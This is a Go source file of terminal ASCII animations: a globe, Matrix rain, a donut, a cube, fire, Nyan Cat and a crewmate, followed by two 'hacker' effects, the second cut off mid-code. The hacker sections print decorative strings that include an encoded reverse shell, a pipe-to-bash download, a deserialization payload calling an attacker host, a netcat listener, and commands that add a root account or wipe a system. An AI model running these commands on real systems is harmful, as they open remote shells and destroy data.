package ascii

import (
	"fmt"
	"math"
	"math/rand"
	"strings"
	"time"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

// ============================================================================
// 1. ROTATING 3D GLOBE (EARTH)
// ============================================================================

var worldMap = []string{
	"                 ..-----..             ......                   ",
	"             ..##:::::::::##.       .##::::::##.                ",
	"           .#################..   .##############.     .##.     ",
	"         .#####################. .#################. .#####.    ",
	"        ############################################.#######.   ",
	"       #####################################################.   ",
	"       .####################################################    ",
	"        ##################################################.     ",
	"         ################################################       ",
	"          #############################################         ",
	"          .###########################################          ",
	"           ##########################################           ",
	"            #######################################.            ",
	"             #####################################              ",
	"              ###################################               ",
	"               ################################                 ",
	"                ##############################                  ",
	"                 .##########################                    ",
	"                   .######################.                     ",
	"     .####################################################.     ",
}

const mapW = 64
const mapH = 20

func isLand(x, y int) bool {
	if y < 0 || y >= len(worldMap) {
		return false
	}
	line := worldMap[y]
	if len(line) == 0 {
		return false
	}
	px := x % len(line)
	if px < 0 {
		px += len(line)
	}
	return line[px] == '#' || line[px] == ':'
}

func GetEarthFrame(tick int, w, h int, useColor bool) string {
	if w <= 0 {
		w = 60
	}
	if h <= 0 {
		h = 24
	}

	ry := float64(h) * 0.42
	rx := ry * 2.0

	cx := float64(w) / 2.0
	cy := float64(h) / 2.0

	angle := float64(tick) * 0.05
	shades := " .,:;-+=*#%@"

	lx, ly, lz := 0.6, -0.4, 0.7
	lLen := math.Sqrt(lx*lx + ly*ly + lz*lz)
	lx, ly, lz = lx/lLen, ly/lLen, lz/lLen

	var sb strings.Builder

	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			dx := (float64(x) - cx) / rx
			dy := (float64(y) - cy) / ry

			distSq := dx*dx + dy*dy
			if distSq <= 1.0 {
				dz := math.Sqrt(1.0 - distSq)
				nx, ny, nz := dx, dy, dz

				rotX := nx*math.Cos(angle) - nz*math.Sin(angle)
				rotZ := nx*math.Sin(angle) + nz*math.Cos(angle)
				rotY := ny

				lat := math.Asin(rotY)
				lon := math.Atan2(rotZ, rotX)

				u := (lon + math.Pi) / (2.0 * math.Pi)
				v := (lat + math.Pi/2.0) / math.Pi

				mapX := int(u * float64(mapW))
				mapY := int(v * float64(mapH))

				// Kararlı gölgelendirme: yüzey normalinin z bileşeni + hafif yatay ışık
				intensity := 0.45 + 0.55*nz + 0.15*(nx*lx+ny*ly)
				if intensity < 0 {
					intensity = 0
				}
				if intensity > 1 {
					intensity = 1
				}

				shadeIdx := int(intensity * float64(len(shades)-1))
				if shadeIdx >= len(shades) {
					shadeIdx = len(shades) - 1
				}

				char := shades[shadeIdx]

				if isLand(mapX, mapY) {
					if useColor {
						sb.WriteString(fmt.Sprintf("\033[1;32m%c\033[0m", char))
					} else {
						sb.WriteByte('@')
					}
				} else {
					if useColor {
						sb.WriteString(fmt.Sprintf("\033[34m%c\033[0m", char))
					} else {
						sb.WriteByte(char)
					}
				}
			} else {
				sb.WriteByte(' ')
			}
		}
		sb.WriteByte('\n')
	}

	return sb.String()
}

// ============================================================================
// 2. MATRIX DIGITAL RAIN
// ============================================================================

var matrixChars = []rune("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz$+-*/%=<>!#^&")

type Drop struct {
	Col   int
	HeadY float64
	Speed float64
	Len   int
}

type MatrixState struct {
	Width   int
	Height  int
	Drops   []Drop
	Grid    [][]rune
	Updates int
}

func NewMatrixState(w, h int) *MatrixState {
	if w <= 0 {
		w = 80
	}
	if h <= 0 {
		h = 24
	}

	state := &MatrixState{
		Width:  w,
		Height: h,
		Drops:  make([]Drop, w/2+5),
		Grid:   make([][]rune, h),
	}

	for i := 0; i < h; i++ {
		state.Grid[i] = make([]rune, w)
		for j := 0; j < w; j++ {
			state.Grid[i][j] = ' '
		}
	}

	colsUsed := make(map[int]bool)
	for i := 0; i < len(state.Drops); i++ {
		col := rand.Intn(w)
		for colsUsed[col] {
			col = rand.Intn(w)
		}
		colsUsed[col] = true

		state.Drops[i] = Drop{
			Col:   col,
			HeadY: float64(rand.Intn(h)),
			Speed: 0.5 + rand.Float64()*1.2,
			Len:   5 + rand.Intn(12),
		}
	}

	return state
}

func (s *MatrixState) Update() {
	s.Updates++

	for y := 0; y < s.Height; y++ {
		for x := 0; x < s.Width; x++ {
			if s.Grid[y][x] != ' ' && rand.Float32() < 0.08 {
				s.Grid[y][x] = matrixChars[rand.Intn(len(matrixChars))]
			}
		}
	}

	for i := 0; i < len(s.Drops); i++ {
		drop := &s.Drops[i]
		drop.HeadY += drop.Speed

		if int(drop.HeadY)-drop.Len >= s.Height {
			drop.HeadY = -float64(rand.Intn(5))
			drop.Speed = 0.5 + rand.Float64()*1.2
			drop.Len = 5 + rand.Intn(12)
			drop.Col = rand.Intn(s.Width)
		}

		head := int(drop.HeadY)
		for lenOffset := 0; lenOffset < drop.Len; lenOffset++ {
			currY := head - lenOffset
			if currY >= 0 && currY < s.Height && drop.Col >= 0 && drop.Col < s.Width {
				if lenOffset == 0 || s.Grid[currY][drop.Col] == ' ' {
					s.Grid[currY][drop.Col] = matrixChars[rand.Intn(len(matrixChars))]
				}
			}
		}

		tailEnd := head - drop.Len
		if tailEnd >= 0 && tailEnd < s.Height && drop.Col >= 0 && drop.Col < s.Width {
			s.Grid[tailEnd][drop.Col] = ' '
		}
	}
}

func GetMatrixFrame(tick int, w, h int, state *MatrixState, useColor bool) (string, *MatrixState) {
	if state == nil || state.Width != w || state.Height != h {
		state = NewMatrixState(w, h)
	}

	state.Update()

	var sb strings.Builder

	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			char := state.Grid[y][x]
			if char == ' ' {
				sb.WriteByte(' ')
				continue
			}

			isHead := false
			isBrightTail := false

			for _, drop := range state.Drops {
				if drop.Col == x {
					headInt := int(drop.HeadY)
					if headInt == y {
						isHead = true
						break
					} else if y > headInt-3 && y < headInt {
						isBrightTail = true
						break
					}
				}
			}

			if useColor {
				if isHead {
					sb.WriteString(fmt.Sprintf("\033[1;37m%c\033[0m", char))
				} else if isBrightTail {
					sb.WriteString(fmt.Sprintf("\033[1;32m%c\033[0m", char))
				} else {
					sb.WriteString(fmt.Sprintf("\033[32m%c\033[0m", char))
				}
			} else {
				if isHead {
					sb.WriteByte('@')
				} else if isBrightTail {
					sb.WriteByte('#')
				} else {
					sb.WriteByte('.')
				}
			}
		}
		sb.WriteByte('\n')
	}

	return sb.String(), state
}

// ============================================================================
// 3. 3D ROTATING DONUT
// ============================================================================

func GetDonutFrame(tick int, w, h int) string {
	if w <= 0 {
		w = 80
	}
	if h <= 0 {
		h = 24
	}

	output := make([]byte, w*h)
	for i := range output {
		output[i] = ' '
	}
	zbuffer := make([]float64, w*h)

	A := float64(tick) * 0.07
	B := float64(tick) * 0.03

	r1 := 1.0
	r2 := 2.0
	k2 := 5.0
	k1 := float64(w) * k2 * 3.0 / (8.0 * (r1 + r2))

	cosA, sinA := math.Cos(A), math.Sin(A)
	cosB, sinB := math.Cos(B), math.Sin(B)

	for theta := 0.0; theta < 2*math.Pi; theta += 0.07 {
		cosTheta, sinTheta := math.Cos(theta), math.Sin(theta)

		for phi := 0.0; phi < 2*math.Pi; phi += 0.02 {
			cosPhi, sinPhi := math.Cos(phi), math.Sin(phi)

			circleX := r2 + r1*cosTheta
			circleY := r1 * sinTheta

			x := circleX*(cosB*cosPhi+sinA*sinB*sinPhi) - circleY*cosA*sinB
			y := circleX*(sinB*cosPhi-sinA*cosB*sinPhi) + circleY*cosA*cosB
			z := k2 + cosA*circleX*sinPhi + circleY*sinA

			ooz := 1.0 / z

			xp := int(float64(w)/2.0 + k1*ooz*x)
			yp := int(float64(h)/2.0 - k1*ooz*y*0.5)

			l := cosPhi*cosTheta*sinB - cosA*cosTheta*sinPhi - sinA*sinTheta + cosB*(cosA*sinTheta-cosTheta*sinA*sinPhi)

			if l > 0 {
				if xp >= 0 && xp < w && yp >= 0 && yp < h {
					idx := xp + yp*w
					if ooz > zbuffer[idx] {
						zbuffer[idx] = ooz
						luminanceChars := ".,-~:;=!*#$@"
						luminanceIdx := int(l * 8)
						if luminanceIdx > 11 {
							luminanceIdx = 11
						}
						output[idx] = luminanceChars[luminanceIdx]
					}
				}
			}
		}
	}

	var sb strings.Builder
	for y := 0; y < h; y++ {
		sb.Write(output[y*w : (y+1)*w])
		sb.WriteByte('\n')
	}

	return sb.String()
}

// ============================================================================
// 4. 3D ROTATING WIREFRAME CUBE
// ============================================================================

type Point3D struct {
	x, y, z float64
}

func GetCubeFrame(tick int, w, h int) string {
	if w <= 0 {
		w = 80
	}
	if h <= 0 {
		h = 24
	}

	grid := make([][]byte, h)
	for i := range grid {
		grid[i] = make([]byte, w)
		for j := range grid[i] {
			grid[i][j] = ' '
		}
	}

	vertices := []Point3D{
		{-1, -1, -1}, {1, -1, -1}, {1, 1, -1}, {-1, 1, -1},
		{-1, -1, 1}, {1, -1, 1}, {1, 1, 1}, {-1, 1, 1},
	}

	edges := [][2]int{
		{0, 1}, {1, 2}, {2, 3}, {3, 0},
		{4, 5}, {5, 6}, {6, 7}, {7, 4},
		{0, 4}, {1, 5}, {2, 6}, {3, 7},
	}

	ax := float64(tick) * 0.04
	ay := float64(tick) * 0.05
	az := float64(tick) * 0.03

	cosX, sinX := math.Cos(ax), math.Sin(ax)
	cosY, sinY := math.Cos(ay), math.Sin(ay)
	cosZ, sinZ := math.Cos(az), math.Sin(az)

	projected := make([][2]int, len(vertices))
	scale := float64(h) * 0.55
	dist := 3.2

	for i, v := range vertices {
		y1 := v.y*cosX - v.z*sinX
		z1 := v.y*sinX + v.z*cosX

		x2 := v.x*cosY + z1*sinY
		z2 := -v.x*sinY + z1*cosY

		x3 := x2*cosZ - y1*sinZ
		y3 := x2*sinZ + y1*cosZ

		xp := int(float64(w)/2.0 + (x3*scale*2.1)/(z2+dist))
		yp := int(float64(h)/2.0 + (y3*scale)/(z2+dist))

		projected[i] = [2]int{xp, yp}
	}

	for _, edge := range edges {
		p0 := projected[edge[0]]
		p1 := projected[edge[1]]
		drawLine(grid, p0[0], p0[1], p1[0], p1[1], w, h, '#')
	}

	var sb strings.Builder
	for y := 0; y < h; y++ {
		sb.Write(grid[y])
		sb.WriteByte('\n')
	}
	return sb.String()
}

func drawLine(grid [][]byte, x0, y0, x1, y1 int, w, h int, char byte) {
	dx := abs(x1 - x0)
	dy := abs(y1 - y0)
	sx, sy := -1, -1
	if x0 < x1 {
		sx = 1
	}
	if y0 < y1 {
		sy = 1
	}
	err := dx - dy

	for {
		if x0 >= 0 && x0 < w && y0 >= 0 && y0 < h {
			grid[y0][x0] = char
		}
		if x0 == x1 && y0 == y1 {
			break
		}
		e2 := 2 * err
		if e2 > -dy {
			err -= dy
			x0 += sx
		}
		if e2 < dx {
			err += dx
			y0 += sy
		}
	}
}

// ============================================================================
// 5. PROCEDURAL DOOM FIRE
// ============================================================================

type FireState struct {
	Width  int
	Height int
	Grid   [][]int
}

func NewFireState(w, h int) *FireState {
	s := &FireState{
		Width:  w,
		Height: h,
		Grid:   make([][]int, h),
	}
	for i := range s.Grid {
		s.Grid[i] = make([]int, w)
	}
	return s
}

func (s *FireState) Update() {
	for x := 0; x < s.Width; x++ {
		s.Grid[s.Height-1][x] = 35
	}

	for y := 0; y < s.Height-1; y++ {
		for x := 0; x < s.Width; x++ {
			srcY := y + 1

			drift := rand.Intn(3) - 1
			decay := rand.Intn(3)

			srcX := (x + drift + s.Width) % s.Width

			val := s.Grid[srcY][srcX] - decay
			if val < 0 {
				val = 0
			}
			s.Grid[y][x] = val
		}
	}
}

func GetFireFrame(tick int, w, h int, state *FireState, useColor bool) (string, *FireState) {
	if state == nil || state.Width != w || state.Height != h {
		state = NewFireState(w, h)
	}

	state.Update()

	var sb strings.Builder
	ramp := " .:-=+*#%@"

	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			heat := state.Grid[y][x]
			charIdx := heat * (len(ramp) - 1) / 35
			if charIdx >= len(ramp) {
				charIdx = len(ramp) - 1
			}
			char := ramp[charIdx]

			if useColor {
				if heat > 28 {
					sb.WriteString(fmt.Sprintf("\033[1;33m%c\033[0m", char))
				} else if heat > 16 {
					sb.WriteString(fmt.Sprintf("\033[33m%c\033[0m", char))
				} else if heat > 8 {
					sb.WriteString(fmt.Sprintf("\033[1;31m%c\033[0m", char))
				} else if heat > 2 {
					sb.WriteString(fmt.Sprintf("\033[31m%c\033[0m", char))
				} else {
					sb.WriteString(fmt.Sprintf("\033[30m%c\033[0m", char))
				}
			} else {
				sb.WriteByte(char)
			}
		}
		sb.WriteByte('\n')
	}

	return sb.String(), state
}

// ============================================================================
// 6. PROCEDURAL NYAN CAT
// ============================================================================

func GetNyanCatFrame(tick int, w, h int, useColor bool) string {
	if w <= 0 {
		w = 80
	}
	if h <= 0 {
		h = 24
	}

	grid := make([][]rune, h)
	colorGrid := make([][]string, h)
	for i := range grid {
		grid[i] = make([]rune, w)
		colorGrid[i] = make([]string, w)
		for j := range grid[i] {
			grid[i][j] = ' '
		}
	}

	cx := w / 2 + 2
	cy := h / 2

	for x := 0; x < cx-5; x++ {
		if x >= w {
			continue
		}
		ry := cy + int(math.Round(1.5*math.Sin(float64(x)*0.22-float64(tick)*0.45)))

		stripes := []struct {
			char  rune
			color string
		}{
			{'+', "\033[1;31m"},
			{'=', "\033[33m"},
			{'*', "\033[1;33m"},
			{'#', "\033[32m"},
			{'.', "\033[34m"},
			{':', "\033[35m"},
		}

		for idx, stripe := range stripes {
			y := ry - 3 + idx
			if y >= 0 && y < h {
				grid[y][x] = stripe.char
				if useColor {
					colorGrid[y][x] = stripe.color
				}
			}
		}
	}

	tailX := cx - 9
	tailY := cy + int(math.Round(1.2*math.Cos(float64(tick)*0.5)))
	for x := tailX - 3; x <= tailX; x++ {
		if x >= 0 && x < w && tailY >= 0 && tailY < h {
			grid[tailY][x] = '~'
			if useColor {
				colorGrid[tailY][x] = "\033[37m"
			}
		}
	}

	legOffset := (tick / 2) % 2
	legsY := cy + 3
	legsX := []int{cx - 5 + legOffset, cx - 2 - legOffset, cx + 1 + legOffset, cx + 4 - legOffset}
	for _, lx := range legsX {
		if lx >= 0 && lx < w && legsY < h {
			grid[legsY][lx] = 'u'
			if useColor {
				colorGrid[legsY][lx] = "\033[37m"
			}
		}
	}

	for y := cy - 3; y <= cy + 2; y++ {
		for x := cx - 7; x <= cx + 5; x++ {
			if x < 0 || x >= w || y < 0 || y >= h {
				continue
			}
			isBorder := x == cx-7 || x == cx+5 || y == cy-3 || y == cy+2
			if isBorder {
				grid[y][x] = '#'
				if useColor {
					colorGrid[y][x] = "\033[1;30m"
				}
			} else {
				if (x+y+tick)%5 == 0 {
					grid[y][x] = '*'
					if useColor {
						colorGrid[y][x] = "\033[1;31m"
					}
				} else if (x-y-tick)%7 == 0 {
					grid[y][x] = '.'
					if useColor {
						colorGrid[y][x] = "\033[1;33m"
					}
				} else {
					grid[y][x] = '='
					if useColor {
						colorGrid[y][x] = "\033[35m"
					}
				}
			}
		}
	}

	headW := 6
	headH := 4
	headStartX := cx + 5
	headStartY := cy - 2
	for y := headStartY; y < headStartY+headH; y++ {
		for x := headStartX; x < headStartX+headW; x++ {
			if x < 0 || x >= w || y < 0 || y >= h {
				continue
			}
			grid[y][x] = 'M'
			if useColor {
				colorGrid[y][x] = "\033[37m"
			}

			if y == cy-1 && (x == headStartX+2 || x == headStartX+4) {
				grid[y][x] = 'o'
				if useColor {
					colorGrid[y][x] = "\033[1;30m"
				}
			}
			if y == cy && (x == headStartX+1 || x == headStartX+5) {
				grid[y][x] = '*'
				if useColor {
					colorGrid[y][x] = "\033[35m"
				}
			}
			if y == cy && x == headStartX+3 {
				grid[y][x] = '.'
				if useColor {
					colorGrid[y][x] = "\033[1;30m"
				}
			}
		}
	}

	earY := headStartY - 1
	if earY >= 0 && earY < h {
		earX1 := headStartX + 1
		earX2 := headStartX + headW - 2
		if earX1 >= 0 && earX1 < w {
			grid[earY][earX1] = '^'
			if useColor {
				colorGrid[earY][earX1] = "\033[37m"
			}
		}
		if earX2 >= 0 && earX2 < w {
			grid[earY][earX2] = '^'
			if useColor {
				colorGrid[earY][earX2] = "\033[37m"
			}
		}
	}

	var sb strings.Builder
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			char := grid[y][x]
			colorStr := colorGrid[y][x]
			if useColor && colorStr != "" && char != ' ' {
				sb.WriteString(colorStr)
				sb.WriteRune(char)
				sb.WriteString("\033[0m")
			} else {
				sb.WriteRune(char)
			}
		}
		sb.WriteByte('\n')
	}

	return sb.String()
}

// ============================================================================
// 7. PROCEDURAL AMONG US CREWMATE
// ============================================================================

func GetCrewmateFrame(tick int, w, h int, useColor bool) string {
	if w <= 0 {
		w = 80
	}
	if h <= 0 {
		h = 24
	}

	grid := make([][]rune, h)
	colorGrid := make([][]string, h)
	for i := range grid {
		grid[i] = make([]rune, w)
		colorGrid[i] = make([]string, w)
		for j := range grid[i] {
			grid[i][j] = ' '
		}
	}

	cx := w / 2
	cy := h / 2 - 1

	phase := (tick / 2) % 2

	bodyColorList := []string{"\033[1;31m", "\033[1;32m", "\033[1;36m", "\033[1;33m", "\033[1;35m"}
	bodyCol := bodyColorList[(tick/10)%len(bodyColorList)]
	shadowCol := strings.Replace(bodyCol, "1;", "", 1)

	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			dx := x - cx
			dy := y - cy

			isVisor := dx >= 1 && dx <= 7 && dy >= -4 && dy <= -1

			isBackpack := dx >= -10 && dx <= -6 && dy >= -3 && dy <= 3

			isLeftLeg := dx >= -5 && dx <= -2
			var leftLegH int
			if phase == 0 {
				leftLegH = 7
			} else {
				leftLegH = 5
			}
			inLeftLegY := dy >= 4 && dy <= leftLegH

			isRightLeg := dx >= 1 && dx <= 4
			var rightLegH int
			if phase == 1 {
				rightLegH = 7
			} else {
				rightLegH = 5
			}
			inRightLegY := dy >= 4 && dy <= rightLegH

			inBody := dx >= -6 && dx <= 5 && dy >= -7 && dy <= 3
			if dy == -7 && (dx == -6 || dx == 5) {
				inBody = false
			}

			if isVisor {
				grid[y][x] = '0'
				if useColor {
					shinePos := (tick / 2) % 6
					if dx-1 == shinePos || dx-2 == shinePos {
						colorGrid[y][x] = "\033[1;37m"
						grid[y][x] = '#'
					} else {
						colorGrid[y][x] = "\033[1;36m"
					}
				}
			} else if inBody || (isLeftLeg && inLeftLegY) || (isRightLeg && inRightLegY) {
				isBodyOutline := false
				if dy == -7 && (dx >= -5 && dx <= 4) {
					isBodyOutline = true
				}
				if dx == -6 && (dy >= -6 && dy <= 3) {
					isBodyOutline = true
				}
				if isLeftLeg && inLeftLegY && (dx == -5 || dx == -2 || dy == leftLegH) {
					isBodyOutline = true
				}
				if isRightLeg && inRightLegY && (dx == 1 || dx == 4 || dy == rightLegH) {
					isBodyOutline = true
				}
				if dy == 3 && dx >= -1 && dx <= 0 {
					isBodyOutline = true
				}
				if dx == 5 && (dy < -4 || dy > 0) && dy >= -6 && dy <= 3 {
					isBodyOutline = true
				}

				if isBodyOutline {
					grid[y][x] = '#'
					if useColor {
						colorGrid[y][x] = "\033[1;30m"
					}
				} else {
					grid[y][x] = '@'
					if useColor {
						if dy > 0 || dx < -2 {
							colorGrid[y][x] = shadowCol
						} else {
							colorGrid[y][x] = bodyCol
						}
					}
				}
			} else if isBackpack {
				isPackOutline := dx == -10 || dy == -3 || dy == 3
				if isPackOutline {
					grid[y][x] = '#'
					if useColor {
						colorGrid[y][x] = "\033[1;30m"
					}
				} else {
					grid[y][x] = 'H'
					if useColor {
						colorGrid[y][x] = shadowCol
					}
				}
			}
		}
	}

	var sb strings.Builder
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			char := grid[y][x]
			colorStr := colorGrid[y][x]
			if useColor && colorStr != "" && char != ' ' {
				sb.WriteString(colorStr)
				sb.WriteRune(char)
				sb.WriteString("\033[0m")
			} else {
				sb.WriteRune(char)
			}
		}
		sb.WriteByte('\n')
	}

	return sb.String()
}

// ============================================================================
// 8. HACKER // SOURCE-CODE SCROLL (HACKER1)
// ============================================================================

var hacker1Snippets = []string{
	"#!/usr/bin/env go run ---> node exploit.js",
	"function bypass(target){ return target.split('').reverse().join(''); }",
	">>> sudo apt-get install payload --yes",
	"[+] Connecting to 10.0.0.1:443 ... [OK]",
	"[+] Injecting 0xDEADBEEF into frame buffer ...",
	"int main(int argc, char** argv){ fork(); execve(\"/bin/sh\",0,0); }",
	"echo \"ACCESS GRANTED\" | nc 192.168.0.1 22",
	"[*] Bruteforcing SHA-1 hash ... 42.6% complete",
	"0x7ffeefbff5c0  ::  /etc/shadow  ::  -rw-r--r--  root",
	"ssh root@mainframe 'rm -rf /*' 2>/dev/null",
	"openssl enc -d -aes-256-cbc -in vault.dat -k supersecret",
	"Loading /lib/x86_64-linux-gnu/libc.so.6 ... done",
	"while(true){ ptrace(PTRACE_ATTACH, pid, 0, 0); }",
	"$ export PS1='[PWNED]# '  ;   id ;  uname -a",
	"[!] Bypassing firewall rule #14  ...  ok",
	"printf '\\x90\\x90\\x90\\xeb\\x05' > shellcode.bin",
	"chmod 777 /etc/passwd && echo 'hax::0:0::/:/bin/sh' >> /etc/passwd",
	"tcpdump -i eth0 -nn -X port 4444 | tee capture.log",
	"git clone https://github.com/x0r/megabypass.git && cd megabypass",
	"curl -X POST https://api.target/keys -d '{\"role\":\"admin\"}'",
	"[*] Heap spray ... 0xffffffffff600000 mapped",
	"select * from users where password like '%' -- ",
	"iptables -F ; iptables -t nat -F ; service sshd restart",
	"==== ENCRYPTED PAYLOAD ============================================",
	"AAAA-1111-BBBB-2222-CCCC-3333-DDDD-4444-EEEE-5555-FFFF-6666",
}

func GetHacker1Frame(tick int, w, h int, useColor bool) string {
	if w <= 0 {
		w = 80
	}
	if h <= 0 {
		h = 24
	}

	grid := make([][]rune, h)
	colorGrid := make([][]string, h)
	for i := range grid {
		grid[i] = make([]rune, w)
		colorGrid[i] = make([]string, w)
		for j := range grid[i] {
			grid[i][j] = ' '
		}
	}

	// Build a long virtual scroll of code that we window into.
	// Re-seed by cycling snippets with a moving offset based on tick.
	offset := (tick * 2) % 200

	for i := 0; i < h; i++ {
		// pick which snippet occupies this row (shifted by offset)
		idx := (offset/3 + i) % len(hacker1Snippets)
		if idx < 0 {
			idx += len(hacker1Snippets)
		}
		line := hacker1Snippets[idx]

		// horizontal scroll jitter
		shift := (offset + i*3) % 14
		if shift < 0 {
			shift = 0
		}

		row := i
		col := 0
		for k := 0; k < shift && col < w; k++ {
			grid[row][col] = ' '
			col++
		}

		for _, ch := range line {
			if col >= w {
				break
			}
			grid[row][col] = ch
			if useColor {
				// color by character class
				switch {
				case ch == '[' || ch == ']' || ch == '{' || ch == '}' || ch == '(' || ch == ')':
					colorGrid[row][col] = "\033[1;33m" // bright yellow
				case ch == '>' || ch == '<' || ch == '=' || ch == '|' || ch == '&' || ch == ';' || ch == '#':
					colorGrid[row][col] = "\033[36m" // cyan
				case ch >= '0' && ch <= '9':
					colorGrid[row][col] = "\033[35m" // magenta numbers
				case ch == '/' || ch == '-' || ch == '.' || ch == '_':
					colorGrid[row][col] = "\033[1;37m"
				default:
					// Random dim/bright mix to feel like a real terminal log
					if (row+col+tick)%5 == 0 {
						colorGrid[row][col] = "\033[1;32m" // bright green highlight
					} else {
						colorGrid[row][col] = "\033[32m" // normal green
					}
				}
			}
			col++
		}
	}

	// Animated cursor block at bottom-right of one of the lines
	cy := h - 1
	cx := w - 1 - (tick/3)%5
	if cx >= 0 && cx < w {
		grid[cy][cx] = '_'
		if useColor {
			colorGrid[cy][cx] = "\033[1;37m"
		}
	}

	var sb strings.Builder
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			char := grid[y][x]
			colorStr := colorGrid[y][x]
			if useColor && colorStr != "" && char != ' ' {
				sb.WriteString(colorStr)
				sb.WriteRune(char)
				sb.WriteString("\033[0m")
			} else {
				sb.WriteRune(char)
			}
		}
		sb.WriteByte('\n')
	}

	return sb.String()
}

// ============================================================================
// 9. HACKER // LIVE TYPING TERMINAL (HACKER2)
// ============================================================================

var hacker2Script = []string{
	"nmap -sS -p- 10.0.0.0/24",
	"hydra -l admin -P rockyou.txt ssh://10.0.0.5",
	"john --wordlist=rockyou.txt hashes.txt",
	"sqlmap -u \"http://target/?id=1\" --dbs --batch",
	"msfconsole -q -x \"use exploit/multi/handler\"",
	"aircrack-ng -w dict.txt -b AA:BB:CC:DD:EE:FF wlan0mon",
	"proxychains4 -q curl http://internal.target/health",
	"gobuster dir -u http://target -w raft.txt -t 50",
	"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
	"scp payload.bin user@jump:/tmp/ && ssh user@jump 'chmod +x /tmp/payload.bin'",
	"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8xMjM0IDA+JjE= | base64 -d | bash",
	"hashcat -m 0 -a 3 hashes.txt ?d?d?d?d?d?d?d?d",
	"burpsuite --project-file=audit.burp --unpause-spider-and-scan",
	"wget -qO- https://raw.githubusercontent.com/x/recon/main/run.sh | bash",
	"sudo tcpdump -w - -U -i any 'not port 22' | nc analyzer 9999",
	"curl -H 'X-Forwarded-For: 127.0.0.1' http://target/admin",
	"php -r 'system(\"id\");'  # testing lfi",
	"java -jar ysoserial.jar CommonsCollections1 'curl http://attacker/rce' | nc target 8080",
	"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@target 'uname -a'",
	"keytool -genkey -alias ghost -keyalg RSA -validity 3650 -keystore ghost.jks",
	"steghide extract -sf photo.jpg -p \"\"",
	"zsteg -a cover.png | head -n 20",
	"exiftool image.jpg | grep -i gps",
	"ffmpeg -i input.mp4 -ss 0 -t 60 -vf fps=30 frame_%04d.png",
	"tail -f /var/log/auth.log  | grep -i 'fail'",
	"find / -perm -4000 -type f 2>/dev/null",
	"watch -n 1 'ss -tunap | grep ESTAB'",
	"crontab -l ;  echo '* * * * * /tmp/.x' >> /tmp/c ;  crontab /tmp/c",
	"chattr +i /etc/shadow ; chattr +i /etc/passwd",
	"iptables -I INPUT 1 -p tcp --dport 4444 -j ACCEPT ; nc -lvnp 4444",
}

func GetHacker2Frame(tick int, w, h int, useColor bool) string {
	if w <= 0 {
		w = 80
	}
	if h <= 0 {
		h = 24
	}

	// Reserve bottom 2 rows for a live "prompt" line and cursor
	promptH := 2
	historyH := h - promptH
	if historyH < 4 {
		historyH = 4
		promptH = h - historyH
	}

	grid := make([][]rune, h)
	colorGrid := make([][]string, h)
	for i := range grid {
		grid[i] = make([]rune, w)
		colorGrid[i] = make([]string, w)
		for j := range grid[i] {
			grid[i][j] = ' '
		}
	}

	// Reveal one extra character of the current command every other tick.
	// When a command finishes, "press Enter" and start the next one.
	totalChars := 0
	for _, s := range hacker2Script {
		totalChars += len(s) + 1 // +1 for newline
	}
	revealTick := (tick * 2) % totalChars

	// Walk script building history lines
	consumed := 0
	currentCmd := ""
	historyLines := []string{}
	for _, s := range hacker2Script {
		segLen := len(s) + 1
		if consumed+segLen <= revealTick {
			historyLines = append(historyLines, s)
			consumed += segLen
			continue
		}
		// partial line
		pos := revealTick - consumed
		if pos < 0 {
			pos = 0
		}
		if pos > len(s) {
			pos = len(s)
		}
		currentCmd = s[:pos]
		break
	}
	if len(historyLines) > historyH {
		historyLines = historyLines[len(historyLines)-historyH:]
	}

	// Render history
	for i, line := range historyLines {
		row := i
		col := 0
		grid[row][col] = '$'
		if useColor {
			colorGrid[row][col] = "\033[1;31m" // red prompt
		}
		col++
		if col < w {
			grid[row][col] = ' '
		}
		col++
		for _, ch := range line {
			if col >= w {
				break
			}
			grid[row][col] = ch
			if useColor {
				switch {
				case ch == ' ':
					// leave default
				case ch >= '0' && ch <= '9':
					colorGrid[row][col] = "\033[35m"
				case ch == '/' || ch == '-' || ch == '.' || ch == '_' || ch == '=' || ch == '\'' || ch == '"':
					colorGrid[row][col] = "\033[36m"
				case ch == '|' || ch == '>' || ch == '<' || ch == ';' || ch == '&':
					colorGrid[row][col] = "\033[1;33m"
				default:
					colorGrid[row][col] = "\033[32m"
				}
			}
			col++
		}
	}

	// Render the current typing line at the bottom history row
	if historyH > 0 {
		row := len(historyLines)
		if row < historyH {
			col := 0
			grid[row][col] = '$'
			if useColor {
				colorGrid[row][col] = "\033[1;31m"
			}
			col++
			if col < w {
				grid[row][col] = ' '
			}
			col++
			for _, ch := range currentCmd {
				if col >= w {
					break
				}
				grid[row][col] = ch
				if useColor {
					switch {
					case ch >= '0' && ch <= '9':
						colorGrid[row][col] = "\033[35m"
					case ch == '/' || ch == '-' || ch == '.' || ch == '_' || ch == '=' || ch == '\'' || ch == '"':
						colorGrid[row][col] = "\033[36m"
					case ch == '|' || ch == '>' || ch == '<' || ch == ';' || ch == '&':
						colorGrid[row][col] = "\033[1;33m"
					default:
						colorGrid[row][col] = "\033[32m"
					}
				}
				col++
			}
			// blinking cursor block
			if (tick/3)%2 == 0 && col < w {
				grid[row][col] = '_'
				if useColor {
					colorGrid[row][col] = "\033[1;37m"
				}
			}
		}
	}

	// Live status bar at the bottom prompt row
	statusRow := h - 1
	status := []string{
		"[root@mainframe ~]# ",
		"pwn:0 crt:1 err:0  ",
		"recv=42.6MB  send=3.1MB ",
		"trace: 10.0.0.5:22 -> OK",
	}
	// rotate the status text per tick to feel alive
	rot := (tick / 10) % len(status)
	col := 0
	for i, s := range status {
		text := s
		if i == rot {
			text = s
		} else {
			continue
		}
		for _, ch := range text {
			if col >= w {
				break
			}
			grid[statusRow][col] = ch
			if useColor {
				if i == 0 {
					colorGrid[statusRow][col] = "\033[1;31m"
				} else {
